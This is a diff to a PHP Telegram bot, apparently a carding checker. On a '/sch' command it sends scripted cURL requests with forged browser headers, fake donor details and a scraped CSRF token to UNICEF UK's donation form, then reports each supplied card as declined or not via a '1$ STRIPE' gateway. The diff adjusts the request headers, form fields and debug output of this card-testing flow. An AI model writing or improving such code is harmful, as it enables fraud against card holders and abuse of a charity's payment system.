@@ -204,12 +204,14 @@ if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 curl_setopt($ch, CURLOPT_POST, 1);
                 $headers = array();
-                $headers[] = 'authority: donate.unicef.org.uk';
+                $headers[] = 'Host: donate.unicef.org.uk';
                 $headers[] = 'method: POST';
+                $headers[] = 'path: /thankyoufordonating/single/1/donate/details';
                 $headers[] = 'scheme: https';
-                $headers[] = 'accept: */*';
-                $headers[] = 'accept-language: en-US,en;q=0.9';
-                $headers[] = 'content-type: application/x-www-form-urlencoded';
+                $headers[] = 'Accept-Language: en-US,en;q=0.5';
+                $headers[] = 'Content-Type: application/x-www-form-urlencoded';
+                $headers[] = 'Origin: https://donate.unicef.org.uk';
+                $headers[] = 'Referer: https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details';
                 $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
                 $headers[] = 'sec-ch-ua-mobile: ?0';
                 $headers[] = 'sec-ch-ua-platform: "Windows"';
@@ -218,15 +220,16 @@ if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){
                 $headers[] = 'sec-fetch-site: same-origin';
                 $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
                 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
                 curl_setopt($ch, CURLOPT_HEADER, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                curl_setopt($ch, CURLOPT_POSTFIELDS, '_csrf=$csrf&lemail=lkadsjflaksdfj%40gamil.com&selectTitle=Mr&firstname=jaklsjf&surname=lkasjdlkj&find=&Line1=B%2C+Priory+Court&Line2=Kingshill+Road&City=Dursley&PostalCode=GL11+4DH&CountryName=United+Kingdom&over18=on&phoneNumber=&warm_audience=&warm_audience_interacted=&fromStage=details');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, '_csrf=$csrf&email=lkadsjflaksdfj%40gamil.com&selectTitle=Mr&firstname=jaklsjf&surname=lkasjdlkj&find=&Line1=B%2C+Priory+Court&Line2=Kingshill+Road&City=Dursley&PostalCode=GL11+4DH&CountryName=United+Kingdom&over18=on&phoneNumber=&warm_audience=&warm_audience_interacted=&fromStage=details');
                 $roll2 = curl_exec($ch);
+
 
                 ///////////////////////////////--------------REQUEST--3-------------/////////////////////////////////////////
 
@@ -250,8 +253,9 @@ if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){
                 $headers[] = 'upgrade-insecure-requests: 1';
                 $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
                 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+                curl_setopt($ch, CURLOPT_HEADER, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -337,8 +341,8 @@ Time -» <b>$time</b><b>s</b>
                   'message_id'=>$messageidtoedit,
                   'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Declined! ❌
-Response -» $tok | csrf - $csrf
-Decline Error -» $errorcode
+Response -» $tok |csrf - $csrf
+Decline Error -» roll 2 - $roll2 | roll3 - $roll3
 Result -» $finger
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
